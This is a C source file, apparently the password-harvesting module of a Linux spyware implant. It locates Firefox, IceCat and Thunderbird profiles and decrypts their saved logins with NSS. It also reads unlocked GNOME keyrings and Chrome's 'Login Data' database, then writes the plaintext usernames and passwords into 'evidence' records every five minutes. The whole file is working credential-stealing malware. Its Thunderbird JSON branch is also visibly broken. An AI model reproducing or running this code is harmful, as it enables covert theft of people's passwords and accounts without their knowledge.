#define _BSD_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/limits.h>
#include <dlfcn.h>
#include <time.h>
#include <json.h>
#include <sqlite3.h>
#include <nss/nss.h>
#include <openssl/bio.h>
#include <gnome-keyring.h>
#include <glob.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "bioutils.h"
#include "fileutils.h"
#include "runtime.h"

static void password_firefox(void);     /* Mozilla Firefox (Iceweasel, GNU IceCat) */
static void password_thunderbird(void); /* Mozilla Thunderbird (Icedove) */
static void password_chrome(void);      /* Google Chrome (Chromium) */
static void password_opera(void);       /* TODO */
static void password_web(void);         /* TODO */

static void entry_add(char *resource, char *service, char *user, char *pass);

struct entry {
   char *resource;
   char *service;
   char *user;
   char *pass;
   struct entry *next;
};

static struct entry *list = NULL, *listp = NULL;
static time_t begin, end;

void *module_password_main(void *args)
{
   BIO *bio_data = NULL;
   char *dataptr;
   long datalen;
   fd_set rfds;
   struct timeval tv;

   debugme("Module PASSWORD started\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      while(MODULE_PASSWORD.status != MODULE_STOPPING) {
         do {
            if(timemark(MODULE_PASSWORD_INDEX, &begin, &end)) break;

            password_firefox();
            password_thunderbird();
            password_chrome();
            password_opera();
            password_web();

            for(listp = list; listp; listp = listp->next) {
               debugme("PASSWORD %s %s %s %s\n", listp->resource, listp->service, listp->user, listp->pass);
               if(BIO_puts16n(bio_data, listp->resource) == -1) break;
               if(BIO_puts16n(bio_data, listp->user) == -1) break;
               if(BIO_puts16n(bio_data, listp->pass) == -1) break;
               if(BIO_puts16n(bio_data, listp->service) == -1) break;
               if(BIO_putsep(bio_data) == -1) break;
            }
            if(listp) break;

            if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;
            evidence_write(EVIDENCE_TYPE_PASSWORD, NULL, 0, dataptr, (int)datalen);
         } while(0);
         BIO_reset(bio_data);

         for(listp = list; listp;) {
            list = listp;
            listp = listp->next;
            if(list->service) free(list->service);
            if(list->user) free(list->user);
            if(list->pass) free(list->pass);
            free(list);
         }
         list = NULL;

         FD_ZERO(&rfds);
         FD_SET(MODULE_PASSWORD.event, &rfds);
         tv.tv_sec = 300;
         tv.tv_usec = 0;
         select(MODULE_PASSWORD.event + 1, &rfds, NULL, NULL, &tv);
      }
   } while(0);
   if(bio_data) BIO_free(bio_data);

   debugme("Module PASSWORD stopped\n");

   return NULL;
}

static void password_firefox(void)
{
   int i, j;
   glob_t g = {0};
   struct stat s;
   char *query = SO"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?";
   char *profile = NULL;
   sqlite3 *db = NULL;
   sqlite3_stmt *stmt = NULL;
   json_object *json = NULL, *logins = NULL, *e = NULL;
   int loginsc = 0, timestamp = 0;
   const char *encuser, *encpass;
   SECStatus status = SECFailure;
   SECItem *secuser = NULL, *secpass = NULL, user = { siBuffer, NULL, 0 }, pass = { siBuffer, NULL, 0 };

   do {
      if(initlib(INIT_LIBNSS3)) break;

      do {
         if(initlib(INIT_LIBSQLITE3)) break;
         if(glob(SO"~/.mozilla/{firefox,icecat}/*/signons.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

         for(i = 0; i < g.gl_pathc; i++) {
            do {
               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
               if(!(profile = strdup(g.gl_pathv[i]))) break;
               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
               if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
               if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
               if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
               if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
               while(sqlite3_step(stmt) == SQLITE_ROW) {
                  do {
                     encuser = sqlite3_column_text(stmt, 1);
                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
                     encpass = sqlite3_column_text(stmt, 2);
                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
                     /* TODO gestire con una lista */
                     if(!list) {
                        if(!(list = malloc(sizeof(struct entry)))) break;
                        listp = list;
                     } else {
                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
                        listp = listp->next;
                     }

                     listp->next = NULL;
                     listp->resource = SO"Firefox";
                     listp->service = strdup(sqlite3_column_text(stmt, 0));
                     if((listp->user = malloc(user.len + 1))) {
                        memcpy(listp->user, (char *)user.data, user.len);
                        listp->user[user.len] = '\0';
                     }
                     if((listp->pass = malloc(pass.len + 1))) {
                        memcpy(listp->pass, (char *)pass.data, pass.len);
                        listp->pass[pass.len] = '\0';
                     }
                     /* TODO */
                  } while(0);
                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
                  if(profile) { free(profile); profile = NULL; }
               }
            } while(0);
            if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
            if(db) { sqlite3_close(db); db = NULL; }
            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
         }
      } while(0);
      globfree(&g); memset(&g, 0x00, sizeof(g));

      do {
         if(glob(SO"~/.mozilla/{firefox,icecat}/*/logins.json", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

         for(i = 0; i < g.gl_pathc; i++) {
            do {
               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
               if(!(profile = strdup(g.gl_pathv[i]))) break;
               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
               if(!(json = json_object_from_file(g.gl_pathv[i]))) break;
               if(!(logins = json_object_object_get(json, SO"logins"))) break;
               loginsc = json_object_array_length(logins);
               for(j = 0; j < loginsc; j++) {
                  do {
                     e = json_object_array_get_idx(logins, j);
                     timestamp = (int)(json_object_get_double(json_object_object_get(e, SO"timePasswordChanged")) / (double)1000);
                     if((timestamp < (int)begin) || (timestamp > end)) break;
                     encuser = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedUsername"));
                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
                     encpass = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedPassword"));
                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
                     /* TODO gestire con una lista */
                     if(!list) {
                        if(!(list = malloc(sizeof(struct entry)))) break;
                        listp = list;
                     } else {
                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
                        listp = listp->next;
                     }

                     listp->next = NULL;
                     listp->resource = SO"Firefox";
                     listp->service = strdup((char *)json_object_get_string(json_object_object_get(e, SO"hostname")));
                     if((listp->user = malloc(user.len + 1))) {
                        memcpy(listp->user, (char *)user.data, user.len);
                        listp->user[user.len] = '\0';
                     }
                     if((listp->pass = malloc(pass.len + 1))) {
                        memcpy(listp->pass, (char *)pass.data, pass.len);
                        listp->pass[pass.len] = '\0';
                     }
                     /* TODO */
                  } while(0);
                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
                  if(profile) { free(profile); profile = NULL; }
               }
            } while(0);
            if(json) { json_object_put(json); json = NULL; }
            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
         }
      } while(0);
      globfree(&g); memset(&g, 0x00, sizeof(g));
   } while(0);

   return;
}

static void password_thunderbird(void)
{
   int i, j;
   glob_t g = {0};
   struct stat s;
   char *query = SO"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?";
   char *profile = NULL;
   sqlite3 *db = NULL;
   sqlite3_stmt *stmt = NULL;
   json_object *json = NULL, *logins = NULL, *e = NULL;
   int loginsc = 0, timestamp = 0;
   const char *encuser, *encpass;
   SECStatus status = SECFailure;
   SECItem *secuser = NULL, *secpass = NULL, user = { siBuffer, NULL, 0 }, pass = { siBuffer, NULL, 0 };

   do {
      if(initlib(INIT_LIBNSS3)) break;

      do {
         if(initlib(INIT_LIBSQLITE3)) break;
         if(glob(SO"~/.{thunderbird,icedove}/*/signons.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

         for(i = 0; i < g.gl_pathc; i++) {
            do {
               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
               if(!(profile = strdup(g.gl_pathv[i]))) break;
               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
               if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
               if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
               if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
               if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
               while(sqlite3_step(stmt) == SQLITE_ROW) {
                  do {
                     encuser = sqlite3_column_text(stmt, 1);
                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
                     encpass = sqlite3_column_text(stmt, 2);
                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
                     /* TODO gestire con una lista */
                     if(!list) {
                        if(!(list = malloc(sizeof(struct entry)))) break;
                        listp = list;
                     } else {
                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
                        listp = listp->next;
                     }

                     listp->next = NULL;
                     listp->resource = SO"Thunderbird";
                     listp->service = strdup(sqlite3_column_text(stmt, 0));
                     if((listp->user = malloc(user.len + 1))) {
                        memcpy(listp->user, (char *)user.data, user.len);
                        listp->user[user.len] = '\0';
                     }
                     if((listp->pass = malloc(pass.len + 1))) {
                        memcpy(listp->pass, (char *)pass.data, pass.len);
                        listp->pass[pass.len] = '\0';
                     }
                     /* TODO */
                  } while(0);
                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
                  if(profile) { free(profile); profile = NULL; }
               }
            } while(0);
            if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
            if(db) { sqlite3_close(db); db = NULL; }
            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
         }
      } while(0);
      globfree(&g); memset(&g, 0x00, sizeof(g));

      do {
         if(glob(SO"~/.{thunderbird,icedove}/*/logins.json", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

         for(i = 0; i < g.gl_pathc; i++) {
            do {
               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
               if(!(profile = strdup(g.gl_pathv[i]))) break;
               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;

               if(!(json = json_object_from_file(g.gl_pathv[i]))) break;
               if(!(logins = json_object_object_get(json, SO"logins"))) break;

               if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
               if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
               if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;

               for(j = 0; j < loginsc; j++) {
                  do {
                     e = json_object_array_get_idx(logins, j);
                     timestamp = (int)(json_object_get_double(json_object_object_get(e, SO"timePasswordChanged")) / (double)1000);
                     if((timestamp < (int)begin) || (timestamp > end)) break;
                     encuser = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedUsername"));
                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
                     encpass = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedPassword"));
                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
                     /* TODO gestire con una lista */
                     if(!list) {
                        if(!(list = malloc(sizeof(struct entry)))) break;
                        listp = list;
                     } else {
                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
                        listp = listp->next;
                     }

                     listp->next = NULL;
                     listp->resource = SO"Thunderbird";
                     listp->service = strdup((char *)json_object_get_string(json_object_object_get(e, SO"hostname")));
                     if((listp->user = malloc(user.len + 1))) {
                        memcpy(listp->user, (char *)user.data, user.len);
                        listp->user[user.len] = '\0';
                     }
                     if((listp->pass = malloc(pass.len + 1))) {
                        memcpy(listp->pass, (char *)pass.data, pass.len);
                        listp->pass[pass.len] = '\0';
                     }
                     /* TODO */
                  } while(0);
                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
                  if(profile) { free(profile); profile = NULL; }
               }
            } while(0);
            if(json) { json_object_put(json); json = NULL; }
            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
         }
      } while(0);
      globfree(&g); memset(&g, 0x00, sizeof(g));
   } while(0);

   return;
}

void password_chrome(void)
{
   GList *keyrings = NULL, *k, *entries = NULL, *e;
   GnomeKeyringInfo *keyringinfo;
   GnomeKeyringItemInfo *iteminfo;
   GnomeKeyringAttributeList *attributes;
   GnomeKeyringAttribute *a;
   char *pass, *user, *service, *resource;
   time_t mtime;
   int i;
   glob_t g = {0};
   struct stat s;
   char *query = SO"SELECT origin_url, username_value, password_value FROM logins WHERE date_created BETWEEN ? AND ?";
   char *tmpf = NULL;
   sqlite3 *db = NULL;
   sqlite3_stmt *stmt = NULL;

   do {
      if(initlib(INIT_LIBGLIB|INIT_LIBGNOMEKEYRING)) break;

      if(!gnome_keyring_is_available()) break;
      if(gnome_keyring_list_keyring_names_sync(&keyrings) != GNOME_KEYRING_RESULT_OK) break;
      for(k = keyrings; k; k = k->next) {
         do {
            keyringinfo = NULL;
            if((gnome_keyring_get_info_sync((char *)k->data, &keyringinfo) != GNOME_KEYRING_RESULT_OK) || gnome_keyring_info_get_is_locked(keyringinfo)) break;

            if(gnome_keyring_list_item_ids_sync((char *)k->data, &entries) != GNOME_KEYRING_RESULT_OK) break;
            for(e = entries; e; e = e->next) {
               do {
                  iteminfo = NULL;
                  attributes = NULL;
                  pass = user = service = resource = NULL;
                  if(gnome_keyring_item_get_info_sync((char *)k->data, (unsigned long)e->data, &iteminfo) != GNOME_KEYRING_RESULT_OK) break;
                  if(!(pass = gnome_keyring_item_info_get_secret(iteminfo)) || !pass[0]) break;
                  mtime = gnome_keyring_item_info_get_mtime(iteminfo);
                  if((mtime < begin) || (mtime > end)) break;
                  if(gnome_keyring_item_get_attributes_sync((char *)k->data, (unsigned long)e->data, &attributes) != GNOME_KEYRING_RESULT_OK) break;
                  do {
                     for(i = 0; i < attributes->len; i++) {
                        a = &gnome_keyring_attribute_list_index(attributes, i);
                        if(!strcmp(a->name, SO"application") && (a->type == GNOME_KEYRING_ATTRIBUTE_TYPE_STRING) && !strncmp(a->value.string, SO"chrome-", strlen(SO"chrome-"))) {
                           resource = SO"Chrome";
                        } else if(!strcmp(a->name, SO"username_value") && (a->type == GNOME_KEYRING_ATTRIBUTE_TYPE_STRING)) {
                           user = a->value.string;
                        } else if(!strcmp(a->name, SO"origin_url") && (a->type == GNOME_KEYRING_ATTRIBUTE_TYPE_STRING)) {
                           service = a->value.string;
                        }
                     }
                     if(resource && service && user) {
                        if(!list) {
                           if(!(list = malloc(sizeof(struct entry)))) break;
                           listp = list;
                        } else {
                           if(!(listp->next = malloc(sizeof(struct entry)))) break;
                           listp = listp->next;
                        }

                        listp->next = NULL;
                        listp->resource = resource;
                        listp->service = strdup(service);
                        listp->user = strdup(user);
                        listp->pass = strdup(pass);

                        break;
                     }
                  } while(0);
               } while(0);
               if(iteminfo) gnome_keyring_item_info_free(iteminfo);
               if(attributes) gnome_keyring_attribute_list_free(attributes);
               if(pass) free(pass);
            }
         } while(0);
         if(keyringinfo) gnome_keyring_info_free(keyringinfo);
         if(entries) g_list_free(entries);
      }
   } while(0);
   if(keyrings) gnome_keyring_string_list_free(keyrings);

   do {
      /* TODO supportare kwallet */
   } while(0);

   do {
      if(initlib(INIT_LIBSQLITE3)) break;
      if(glob(SO"~/.config/{google-chrome,chromium}/*/Login Data", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

      for(i = 0; i < g.gl_pathc; i++) {
         do {
            if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
            if(!(tmpf = clonefile(g.gl_pathv[i]))) break;
            if(sqlite3_open(tmpf, &db) != SQLITE_OK) break;
            if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
            while(sqlite3_step(stmt) == SQLITE_ROW) {
               /* TODO gestire con una lista */
               if(!list) {
                  if(!(list = malloc(sizeof(struct entry)))) break;
                  listp = list;
               } else {
                  if(!(listp->next = malloc(sizeof(struct entry)))) break;
                  listp = listp->next;
               }

               listp->next = NULL;
               listp->resource = SO"Chrome";
               listp->service = strdup(sqlite3_column_text(stmt, 0));
               listp->user = strdup(sqlite3_column_text(stmt, 1));
               listp->pass = strdup(sqlite3_column_text(stmt, 2));
               /* TODO */
            }
         } while(0);
         if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
         if(db) { sqlite3_close(db); db = NULL; }
         if(tmpf) { unlink(tmpf); free(tmpf); tmpf = NULL; }
      }
   } while(0);
   globfree(&g);

   return;
}

static void password_opera(void) {} /* TODO */
static void password_web(void) {} /* TODO */
